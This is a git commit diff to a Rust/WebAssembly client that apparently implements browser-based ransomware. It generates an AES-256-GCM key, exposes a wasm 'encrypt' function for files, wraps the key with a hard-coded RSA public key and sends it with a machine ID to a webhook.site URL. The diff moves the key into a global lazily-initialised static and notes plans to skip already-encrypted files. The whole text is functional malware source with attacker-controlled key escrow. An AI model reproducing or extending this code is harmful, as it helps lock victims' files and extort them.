c7af21475018ab6acf458db492dcd5e16f187b76
hitori1403 <hitori1403@gmail.com>
2024-05-12 22:30:53 +0700

    move key to global scope using once_cell

--- client/src/lib.rs
+++ client/src/lib.rs
@@ -2,9 +2,10 @@ mod utils;
 
 use aes_gcm::{
     aead::{Aead, KeyInit, OsRng},
-    AeadCore, Aes256Gcm,
+    AeadCore, Aes256Gcm, Key,
 };
 use base64::{engine::general_purpose::STANDARD, Engine};
+use once_cell::sync::Lazy;
 use rand::distributions::{Alphanumeric, DistString};
 use rsa::{pkcs1::DecodeRsaPublicKey, Pkcs1v15Encrypt, RsaPublicKey};
 use wasm_bindgen::prelude::*;
@@ -15,10 +16,12 @@ static SERVER_URL: &str = "https://webhook.site/11d4daa1-ff9d-4d6d-9df7-864f8d18
 
 static PUBLIC_KEY: &str = "-----BEGIN RSA PUBLIC KEY-----\nMIIBCgKCAQEAodnCUqJjbJcpWgqpGP77GVIDSTgxxJqvwU4/b0IIcKScxf/tD+tq\nPVg6rwL8Kr3uVsCQUS1GZWrQhBNYDWZzp/o51MuuXYa7RVAa20siHhir/HnQiHi/\nmXSnPIWSHOu69cNJw8A3LV73cVBV1QM6QJ2p9VyRVPe2rjKE9rgJszuBVBkf1+D+\noTjCPOOPWCNQFaP7WQZ1up+xcEvZs6xxSek1q7WUmzWkaS+6amtrF2WfVe5j1dYK\nmuzutnnW6797sMtxD5AXkJm1NLWDxkGvnQeLlKc4pLsGH8yBmYyvw+IFKG82BMdX\nLJ8CbwotJo9A7fmiWMLwjLb9Ev1xu8bhkQIDAQAB\n-----END RSA PUBLIC KEY-----";
 
-// BUG: find a way to call encrypt with key from global or start function in order not to generate
-// key each time
-// #[wasm_bindgen]
-pub fn encrypt(cipher: Aes256Gcm, plaintext: Vec<u8>) -> Vec<u8> {
+static AES_KEY: Lazy<Key<Aes256Gcm>> = Lazy::new(|| Aes256Gcm::generate_key(OsRng));
+
+// TODO: dont encrypt file already encrypted
+#[wasm_bindgen]
+pub fn encrypt(plaintext: Vec<u8>) -> Vec<u8> {
+    let cipher = Aes256Gcm::new(&AES_KEY);
     let nonce = Aes256Gcm::generate_nonce(&mut OsRng);
 
     let ciphertext = cipher.encrypt(&nonce, plaintext.as_ref()).unwrap();
@@ -28,11 +31,11 @@ pub fn encrypt(cipher: Aes256Gcm, plaintext: Vec<u8>) -> Vec<u8> {
     encrypted
 }
 
-async fn send_machine_info(machine_id: String, key: Vec<u8>) {
+async fn send_machine_info(machine_id: String) {
     let rsa_public_key = RsaPublicKey::from_pkcs1_pem(PUBLIC_KEY).unwrap();
 
     let encrypted_key = rsa_public_key
-        .encrypt(&mut OsRng, Pkcs1v15Encrypt, key.as_ref())
+        .encrypt(&mut OsRng, Pkcs1v15Encrypt, AES_KEY.as_ref())
         .unwrap();
 
     let base64_encoded_body = STANDARD.encode([machine_id.into_bytes(), encrypted_key].concat());
@@ -62,9 +65,6 @@ async fn start() {
 
     local_storage.set_item("machine_id", &machine_id).unwrap();
 
-    let key = Aes256Gcm::generate_key(OsRng);
-
-    send_machine_info(machine_id, key.to_vec()).await;
-
-    let cipher = Aes256Gcm::new(&key);
+    // TODO: using one key per machine
+    send_machine_info(machine_id).await;
 }
